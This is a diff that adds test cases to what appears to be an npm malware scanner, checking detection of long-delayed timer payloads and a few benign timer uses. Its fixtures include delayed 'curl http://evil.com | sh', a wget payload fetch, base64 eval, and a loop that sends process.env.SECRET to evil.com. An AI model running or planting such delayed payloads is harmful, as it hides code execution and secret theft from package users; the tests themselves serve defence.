@@ -2313,6 +2313,146 @@ setTimeout(() => run(), delay);
     } finally { cleanupTemp(tmp); }
   });
 
+  // ===== Timer delayed payload (AST-085) =====
+  console.log('\n=== TIMER DELAYED PAYLOAD TESTS ===\n');
+
+  await asyncTest('AST: setTimeout(() => execSync(...), 300000) (5min) → timer_delayed_payload HIGH', async () => {
+    const tmp = makeTempPkg(`
+setTimeout(() => {
+  require('child_process').execSync('curl http://evil.com | sh');
+}, 300000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(t, 'Should detect timer_delayed_payload for 5min delay + execSync');
+      assert(t.severity === 'HIGH', `Expected HIGH for 5min, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(function() { eval(...) }, 1800000) (30min) → timer_delayed_payload CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+setTimeout(function() {
+  const code = Buffer.from('Y29uc29sZS5sb2coJ3B3bmVkJyk=', 'base64').toString();
+  eval(code);
+}, 1800000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(t, 'Should detect timer_delayed_payload for 30min delay + eval');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL for >=15min, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(() => spawn(...), 10*60*1000) → timer_delayed_payload HIGH (BinaryExpression)', async () => {
+    const tmp = makeTempPkg(`
+setTimeout(() => {
+  const { spawn } = require('child_process');
+  spawn('sh', ['-c', 'wget http://evil.com/payload']);
+}, 10 * 60 * 1000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(t, 'Should detect timer_delayed_payload for BinaryExpression delay + spawn');
+      assert(t.severity === 'HIGH', `Expected HIGH for 10min, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setInterval(() => new Function(...), 900000) → timer_delayed_payload CRITICAL', async () => {
+    const tmp = makeTempPkg(`
+setInterval(() => {
+  const fn = new Function('return process.env.SECRET');
+  fetch('https://evil.com/steal?d=' + fn());
+}, 900000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(t, 'Should detect timer_delayed_payload for setInterval + new Function');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL for >=15min, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(() => new Function(decoded)(require), 2400000) → CRITICAL (logkitx DPRK)', async () => {
+    const tmp = makeTempPkg(`
+const decoded = Buffer.from(encoded, 'base64').toString();
+setTimeout(() => new Function(decoded)(require), 2400000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(t, 'Should detect timer_delayed_payload for logkitx pattern');
+      assert(t.severity === 'CRITICAL', `Expected CRITICAL for 40min, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(resolve, 120000) in Promise → NO timer_delayed_payload', async () => {
+    const tmp = makeTempPkg(`
+function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
+async function run() { await delay(120000); console.log('done'); }
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(!t, 'setTimeout(resolve, ms) should NOT trigger timer_delayed_payload');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(() => exec(...), 1000) (1s) → NO timer_delayed_payload', async () => {
+    const tmp = makeTempPkg(`
+setTimeout(() => {
+  require('child_process').exec('npm test');
+}, 1000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(!t, '1s delay should NOT trigger timer_delayed_payload');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(() => regex.exec(...), 120000) → NO timer_delayed_payload (RegExp FP)', async () => {
+    const tmp = makeTempPkg(`
+setTimeout(() => {
+  const match = /[a-z]+/.exec(inputData);
+  if (match) results.push(match[0]);
+}, 120000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(!t, 'RegExp.exec() should NOT trigger timer_delayed_payload');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(() => fetch(...), 300000) → NO timer_delayed_payload', async () => {
+    const tmp = makeTempPkg(`
+setTimeout(() => {
+  fetch('https://api.example.com/health').then(r => console.log(r.status));
+}, 300000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'timer_delayed_payload');
+      assert(!t, 'fetch without eval/exec should NOT trigger timer_delayed_payload');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('AST: setTimeout(fn, 2*60*60*1000) (2h) → static_timer_bomb MEDIUM (BinaryExpression fix)', async () => {
+    const tmp = makeTempPkg(`
+function activate() { console.log('delayed'); }
+setTimeout(activate, 2 * 60 * 60 * 1000);
+`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'static_timer_bomb');
+      assert(t, 'Should detect static_timer_bomb for BinaryExpression 2h delay');
+      assert(t.severity === 'MEDIUM', `Expected MEDIUM for 2h, got ${t.severity}`);
+    } finally { cleanupTemp(tmp); }
+  });
+
   // ===== npm publish worm (AST-051) =====
   console.log('\n=== NPM PUBLISH WORM TESTS ===\n');
 
